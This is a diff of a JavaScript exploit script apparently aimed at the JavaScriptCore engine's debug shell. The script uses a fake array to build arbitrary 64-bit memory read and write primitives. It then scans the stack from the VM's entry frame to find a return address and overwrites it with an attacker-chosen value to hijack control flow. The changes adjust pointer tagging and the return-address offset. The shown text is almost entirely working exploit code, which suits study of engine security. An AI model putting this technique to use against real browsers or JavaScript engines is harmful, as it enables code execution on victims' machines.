@@ -216,7 +216,7 @@ function asDouble(v) {
         (lldb) p JSC::JSValue::decode(0xDEADDEADDEADDEADll).asDouble()
         (double) $4 = -1.1136337192107337E+148
     */
-    fakearray[1] = asDouble('0xDEADDEADDEADDEAD')
+    fakearray[1] = asDouble(0x00002000BADBBADBn)
 
     p("Fake array after")
     $vm.dumpCell(fakearray)
@@ -226,10 +226,12 @@ function asDouble(v) {
 
     memory = {
         read: function(addr, length) {
-            if (verbose)
-                p("[<] Reading " + length + " bytes from " + addr + " which is encoded as " + asDouble(addr))
-            fakearray[1] = asDouble(addr)
-            // $vm.dumpCell(hax)
+            if (verbose) {
+                p("[<] Reading " + length + " bytes from :")
+            	hd(addr)
+            }
+            fakearray[1] = asDouble(addr | 0x0000200000000000n)
+            //$vm.dumpCell(hax)
             let arr = []
             for (var i = 0; i < length; i++)
                 arr[i] = hax[i];
@@ -243,7 +245,7 @@ function asDouble(v) {
         write: function(addr, data) {
             if (verbose)
                 p("[>] Writing " + data.length + " bytes to " + addr);
-            fakearray[1] = asDouble(addr);
+            fakearray[1] = asDouble(addr | 0x0000200000000000n)
             for (var i = 0; i < data.length; i++)
                 hax[i] = data[i];
         },
@@ -259,7 +261,7 @@ function asDouble(v) {
     read64 = function (addr) {
         return memory.readInt64(addr)
     }
-    
+
     write64 = function (addr, val) {
         return memory.writeInt64(addr, val)
     }
@@ -282,11 +284,6 @@ function hd(i) { p("0x" + i.toString(16)) }
 
 function inspectCell(c) {
     $vm.dumpCell(c)
-}
-
-function tierUp(o) {
-    for (let i = 0; i < 1000000; ++i)
-        o()
 }
 
 const offsetMap = new Map([
@@ -340,9 +337,6 @@ function derefAssign(o, field, val) {
 
 // -------------------------------------------------------------------------
 
-//if (verbose)
-//    $vm.dumpRegisters()
-
 let stack = deref(globalThis, "JSGlobalProxy::m_target.JSGlobalObject::m_vm.VM::topEntryFrame")
 p("A stack address:")
 hd(stack)
@@ -350,9 +344,6 @@ hd(stack)
 p("---")
 
 function findReturnAddress(a, b, c, d, e, f, g, h, i, j, k, l) {
-    if (verbose)
-        $vm.dumpRegisters()
-
     let myStack = 0
     let fail = 0
     for (let i = stack; ; i -= 8n) {
@@ -365,7 +356,7 @@ function findReturnAddress(a, b, c, d, e, f, g, h, i, j, k, l) {
             myStack = i
             break
         }
-        
+
         ++fail
         if (fail > 1000)
             throw "Failed to find stack"
@@ -374,12 +365,24 @@ function findReturnAddress(a, b, c, d, e, f, g, h, i, j, k, l) {
     p("Found my stack: ")
     hd(myStack)
 
-    p("Found ret pc at:")
-    let retPC = myStack - 0xb31fff30n + 0xb31fff10n
-    hd(retPC)
-    hd(read64(retPC))
+    //$vm.crash()
 
-    write64(retPC, 0xBFBF691137n)
+    p("Found non-cloop ret pc at:") // I searched in GDB for this offset
+    let retPC = myStack - 0xb31fff30n + 0xbfffedbcn
+    hd(retPC)
+
+    let retPCVal = read64(retPC)
+
+    hd(retPCVal & 0xFFFFFFFFn)
+    p("(actual): ")
+    hd($vm.read64(retPC, false))
+    retPCVal = (retPCVal & (~0xFFFFFFFFn)) | 0xBFBF691137n
+    p("Going to write: ")
+    hd(retPCVal)
+
+    write64(retPC, retPCVal)
+    p('Written!')
+    hd($vm.read64(retPC, false))
 }
 
 findReturnAddress(0xBF, 0xEF)
